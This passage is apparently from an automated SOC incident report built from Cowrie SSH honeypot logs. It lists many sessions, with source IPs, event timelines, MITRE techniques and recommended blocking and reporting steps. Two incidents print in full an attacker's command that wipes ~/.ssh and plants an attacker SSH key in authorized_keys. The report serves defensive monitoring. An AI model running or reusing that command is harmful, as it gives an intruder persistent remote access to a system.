| `2026-09-27 13:15:21` | `cowrie.login.success` |
| `2026-09-27 13:15:22` | `cowrie.session.params` |
| `2026-09-27 13:15:22` | `cowrie.command.input` |
| `2026-09-27 13:15:22` | `cowrie.log.closed` |
| `2026-09-27 13:15:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dcdbe8b066f8

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:15 |
| **Last Seen** | 2026-09-27 13:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:15:26` | `cowrie.session.connect` |
| `2026-09-27 13:15:26` | `cowrie.client.version` |
| `2026-09-27 13:15:26` | `cowrie.client.kex` |
| `2026-09-27 13:15:26` | `cowrie.login.success` |
| `2026-09-27 13:15:27` | `cowrie.session.params` |
| `2026-09-27 13:15:27` | `cowrie.command.input` |
| `2026-09-27 13:15:27` | `cowrie.log.closed` |
| `2026-09-27 13:15:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-02b615878314

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:15 |
| **Last Seen** | 2026-09-27 13:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:15:30` | `cowrie.session.connect` |
| `2026-09-27 13:15:30` | `cowrie.client.version` |
| `2026-09-27 13:15:30` | `cowrie.client.kex` |
| `2026-09-27 13:15:31` | `cowrie.login.success` |
| `2026-09-27 13:15:32` | `cowrie.session.params` |
| `2026-09-27 13:15:32` | `cowrie.command.input` |
| `2026-09-27 13:15:32` | `cowrie.log.closed` |
| `2026-09-27 13:15:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a931d742719e

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:15 |
| **Last Seen** | 2026-09-27 13:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:15:35` | `cowrie.session.connect` |
| `2026-09-27 13:15:35` | `cowrie.client.version` |
| `2026-09-27 13:15:35` | `cowrie.client.kex` |
| `2026-09-27 13:15:35` | `cowrie.login.success` |
| `2026-09-27 13:15:36` | `cowrie.session.params` |
| `2026-09-27 13:15:36` | `cowrie.command.input` |
| `2026-09-27 13:15:36` | `cowrie.log.closed` |
| `2026-09-27 13:15:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ed39648c83fc

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:15 |
| **Last Seen** | 2026-09-27 13:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:15:40` | `cowrie.session.connect` |
| `2026-09-27 13:15:40` | `cowrie.client.version` |
| `2026-09-27 13:15:40` | `cowrie.client.kex` |
| `2026-09-27 13:15:41` | `cowrie.login.success` |
| `2026-09-27 13:15:41` | `cowrie.session.params` |
| `2026-09-27 13:15:41` | `cowrie.command.input` |
| `2026-09-27 13:15:42` | `cowrie.log.closed` |
| `2026-09-27 13:15:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b7bf8ad9d3f7

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:15 |
| **Last Seen** | 2026-09-27 13:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:15:45` | `cowrie.session.connect` |
| `2026-09-27 13:15:45` | `cowrie.client.version` |
| `2026-09-27 13:15:45` | `cowrie.client.kex` |
| `2026-09-27 13:15:45` | `cowrie.login.success` |
| `2026-09-27 13:15:46` | `cowrie.session.params` |
| `2026-09-27 13:15:46` | `cowrie.command.input` |
| `2026-09-27 13:15:46` | `cowrie.log.closed` |
| `2026-09-27 13:15:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a176ec0a455f

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:15 |
| **Last Seen** | 2026-09-27 13:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:15:50` | `cowrie.session.connect` |
| `2026-09-27 13:15:50` | `cowrie.client.version` |
| `2026-09-27 13:15:50` | `cowrie.client.kex` |
| `2026-09-27 13:15:51` | `cowrie.login.success` |
| `2026-09-27 13:15:51` | `cowrie.session.params` |
| `2026-09-27 13:15:51` | `cowrie.command.input` |
| `2026-09-27 13:15:51` | `cowrie.log.closed` |
| `2026-09-27 13:15:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fe16a37bab97

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:15 |
| **Last Seen** | 2026-09-27 13:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:15:55` | `cowrie.session.connect` |
| `2026-09-27 13:15:55` | `cowrie.client.version` |
| `2026-09-27 13:15:55` | `cowrie.client.kex` |
| `2026-09-27 13:15:56` | `cowrie.login.success` |
| `2026-09-27 13:15:56` | `cowrie.session.params` |
| `2026-09-27 13:15:56` | `cowrie.command.input` |
| `2026-09-27 13:15:57` | `cowrie.log.closed` |
| `2026-09-27 13:15:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ed93de6c9b70

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:16 |
| **Last Seen** | 2026-09-27 13:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:16:00` | `cowrie.session.connect` |
| `2026-09-27 13:16:00` | `cowrie.client.version` |
| `2026-09-27 13:16:00` | `cowrie.client.kex` |
| `2026-09-27 13:16:01` | `cowrie.login.success` |
| `2026-09-27 13:16:01` | `cowrie.session.params` |
| `2026-09-27 13:16:01` | `cowrie.command.input` |
| `2026-09-27 13:16:02` | `cowrie.log.closed` |
| `2026-09-27 13:16:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-efec7476871c

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:16 |
| **Last Seen** | 2026-09-27 13:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:16:04` | `cowrie.session.connect` |
| `2026-09-27 13:16:04` | `cowrie.client.version` |
| `2026-09-27 13:16:05` | `cowrie.client.kex` |
| `2026-09-27 13:16:05` | `cowrie.login.success` |
| `2026-09-27 13:16:06` | `cowrie.session.params` |
| `2026-09-27 13:16:06` | `cowrie.command.input` |
| `2026-09-27 13:16:06` | `cowrie.log.closed` |
| `2026-09-27 13:16:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2beecf5c215c

| Field | Detail |
|---|---|
| **Source IP** | `68.183.92[.]206` |
| **First Seen** | 2026-09-27 13:16 |
| **Last Seen** | 2026-09-27 13:16 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:16:08` | `cowrie.session.connect` |
| `2026-09-27 13:16:08` | `cowrie.client.version` |
| `2026-09-27 13:16:08` | `cowrie.client.kex` |
| `2026-09-27 13:16:09` | `cowrie.login.success` |
| `2026-09-27 13:16:10` | `cowrie.session.params` |
| `2026-09-27 13:16:10` | `cowrie.command.input` |
| `2026-09-27 13:16:10` | `cowrie.command.failed` |
| `2026-09-27 13:16:11` | `cowrie.log.closed` |
| `2026-09-27 13:16:12` | `cowrie.session.params` |
| `2026-09-27 13:16:12` | `cowrie.command.input` |
| `2026-09-27 13:16:12` | `cowrie.session.file_download` |
| `2026-09-27 13:16:12` | `cowrie.log.closed` |
| `2026-09-27 13:16:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `68.183.92[.]206` to AbuseIPDB if not already reported
- [ ] Block `68.183.92[.]206` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d32b55c22575

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:16 |
| **Last Seen** | 2026-09-27 13:16 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:16:10` | `cowrie.session.connect` |
| `2026-09-27 13:16:10` | `cowrie.client.version` |
| `2026-09-27 13:16:10` | `cowrie.client.kex` |
| `2026-09-27 13:16:11` | `cowrie.login.success` |
| `2026-09-27 13:16:12` | `cowrie.session.params` |
| `2026-09-27 13:16:12` | `cowrie.command.input` |
| `2026-09-27 13:16:12` | `cowrie.log.closed` |
| `2026-09-27 13:16:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3b483872db70

| Field | Detail |
|---|---|
| **Source IP** | `68.183.92[.]206` |
| **First Seen** | 2026-09-27 13:16 |
| **Last Seen** | 2026-09-27 13:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:16:12` | `cowrie.session.connect` |
| `2026-09-27 13:16:12` | `cowrie.client.version` |
| `2026-09-27 13:16:12` | `cowrie.client.kex` |
| `2026-09-27 13:16:13` | `cowrie.login.success` |
| `2026-09-27 13:16:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `68.183.92[.]206` to AbuseIPDB if not already reported
- [ ] Block `68.183.92[.]206` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7e97bf37bb49

| Field | Detail |
|---|---|
| **Source IP** | `68.183.92[.]206` |
| **First Seen** | 2026-09-27 13:16 |
| **Last Seen** | 2026-09-27 13:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:16:14` | `cowrie.session.connect` |
| `2026-09-27 13:16:14` | `cowrie.client.version` |
| `2026-09-27 13:16:14` | `cowrie.client.kex` |
| `2026-09-27 13:16:15` | `cowrie.login.success` |
| `2026-09-27 13:16:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `68.183.92[.]206` to AbuseIPDB if not already reported
- [ ] Block `68.183.92[.]206` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b7fbe104366f

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:16 |
| **Last Seen** | 2026-09-27 13:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:16:14` | `cowrie.session.connect` |
| `2026-09-27 13:16:14` | `cowrie.client.version` |
| `2026-09-27 13:16:14` | `cowrie.client.kex` |
| `2026-09-27 13:16:15` | `cowrie.login.success` |
| `2026-09-27 13:16:16` | `cowrie.session.params` |
| `2026-09-27 13:16:16` | `cowrie.command.input` |
| `2026-09-27 13:16:16` | `cowrie.log.closed` |
| `2026-09-27 13:16:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cbab4b65240f

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:16 |
| **Last Seen** | 2026-09-27 13:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:16:20` | `cowrie.session.connect` |
| `2026-09-27 13:16:20` | `cowrie.client.version` |
| `2026-09-27 13:16:20` | `cowrie.client.kex` |
| `2026-09-27 13:16:20` | `cowrie.login.success` |
| `2026-09-27 13:16:21` | `cowrie.session.params` |
| `2026-09-27 13:16:21` | `cowrie.command.input` |
| `2026-09-27 13:16:21` | `cowrie.log.closed` |
| `2026-09-27 13:16:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f627d3440d27

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:16 |
| **Last Seen** | 2026-09-27 13:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:16:25` | `cowrie.session.connect` |
| `2026-09-27 13:16:25` | `cowrie.client.version` |
| `2026-09-27 13:16:25` | `cowrie.client.kex` |
| `2026-09-27 13:16:25` | `cowrie.login.success` |
| `2026-09-27 13:16:26` | `cowrie.session.params` |
| `2026-09-27 13:16:26` | `cowrie.command.input` |
| `2026-09-27 13:16:26` | `cowrie.log.closed` |
| `2026-09-27 13:16:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-04dc373dbd8d

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:16 |
| **Last Seen** | 2026-09-27 13:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:16:30` | `cowrie.session.connect` |
| `2026-09-27 13:16:30` | `cowrie.client.version` |
| `2026-09-27 13:16:30` | `cowrie.client.kex` |
| `2026-09-27 13:16:30` | `cowrie.login.success` |
| `2026-09-27 13:16:31` | `cowrie.session.params` |
| `2026-09-27 13:16:31` | `cowrie.command.input` |
| `2026-09-27 13:16:31` | `cowrie.log.closed` |
| `2026-09-27 13:16:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5f4dc389d795

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:16 |
| **Last Seen** | 2026-09-27 13:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:16:35` | `cowrie.session.connect` |
| `2026-09-27 13:16:35` | `cowrie.client.version` |
| `2026-09-27 13:16:35` | `cowrie.client.kex` |
| `2026-09-27 13:16:35` | `cowrie.login.success` |
| `2026-09-27 13:16:36` | `cowrie.session.params` |
| `2026-09-27 13:16:36` | `cowrie.command.input` |
| `2026-09-27 13:16:36` | `cowrie.log.closed` |
| `2026-09-27 13:16:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3bc4551f5f01

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:16 |
| **Last Seen** | 2026-09-27 13:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:16:39` | `cowrie.session.connect` |
| `2026-09-27 13:16:39` | `cowrie.client.version` |
| `2026-09-27 13:16:40` | `cowrie.client.kex` |
| `2026-09-27 13:16:40` | `cowrie.login.success` |
| `2026-09-27 13:16:41` | `cowrie.session.params` |
| `2026-09-27 13:16:41` | `cowrie.command.input` |
| `2026-09-27 13:16:41` | `cowrie.log.closed` |
| `2026-09-27 13:16:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-73adcb25b40e

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:16 |
| **Last Seen** | 2026-09-27 13:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:16:44` | `cowrie.session.connect` |
| `2026-09-27 13:16:44` | `cowrie.client.version` |
| `2026-09-27 13:16:44` | `cowrie.client.kex` |
| `2026-09-27 13:16:45` | `cowrie.login.success` |
| `2026-09-27 13:16:46` | `cowrie.session.params` |
| `2026-09-27 13:16:46` | `cowrie.command.input` |
| `2026-09-27 13:16:46` | `cowrie.log.closed` |
| `2026-09-27 13:16:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f2c802b4e779

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:16 |
| **Last Seen** | 2026-09-27 13:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:16:50` | `cowrie.session.connect` |
| `2026-09-27 13:16:50` | `cowrie.client.version` |
| `2026-09-27 13:16:50` | `cowrie.client.kex` |
| `2026-09-27 13:16:50` | `cowrie.login.success` |
| `2026-09-27 13:16:51` | `cowrie.session.params` |
| `2026-09-27 13:16:51` | `cowrie.command.input` |
| `2026-09-27 13:16:52` | `cowrie.log.closed` |
| `2026-09-27 13:16:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a74982d4b4de

| Field | Detail |
|---|---|
| **Source IP** | `14.224.213[.]222` |
| **First Seen** | 2026-09-27 13:16 |
| **Last Seen** | 2026-09-27 13:17 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:16:51` | `cowrie.session.connect` |
| `2026-09-27 13:16:51` | `cowrie.client.version` |
| `2026-09-27 13:16:51` | `cowrie.client.kex` |
| `2026-09-27 13:16:53` | `cowrie.login.success` |
| `2026-09-27 13:16:54` | `cowrie.session.params` |
| `2026-09-27 13:16:54` | `cowrie.command.input` |
| `2026-09-27 13:16:54` | `cowrie.command.failed` |
| `2026-09-27 13:16:58` | `cowrie.log.closed` |
| `2026-09-27 13:16:59` | `cowrie.session.params` |
| `2026-09-27 13:16:59` | `cowrie.command.input` |
| `2026-09-27 13:16:59` | `cowrie.session.file_download` |
| `2026-09-27 13:16:59` | `cowrie.log.closed` |
| `2026-09-27 13:17:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.224.213[.]222` to AbuseIPDB if not already reported
- [ ] Block `14.224.213[.]222` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-56f40a56e572

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]65` |
| **First Seen** | 2026-09-27 13:16 |
| **Last Seen** | 2026-09-27 13:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-27 13:16:55` | `cowrie.session.connect` |
| `2026-09-27 13:16:55` | `cowrie.client.version` |
| `2026-09-27 13:16:55` | `cowrie.client.kex` |
| `2026-09-27 13:16:55` | `cowrie.login.success` |
| `2026-09-27 13:16:56` | `cowrie.session.params` |
| `2026-09-27 13:16:56` | `cowrie.command.input` |
| `2026-09-27 13:16:56` | `cowrie.log.closed` |
| `2026-09-27 13:16:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]65` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9d47c64b3918

| Field | Detail |
|---|---|
| **Source IP** | `14.224.213[.]222` |
| **First Seen** | 2026-09-27 13:16 |
| **Last Seen** | 2026-09-27 13:17 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
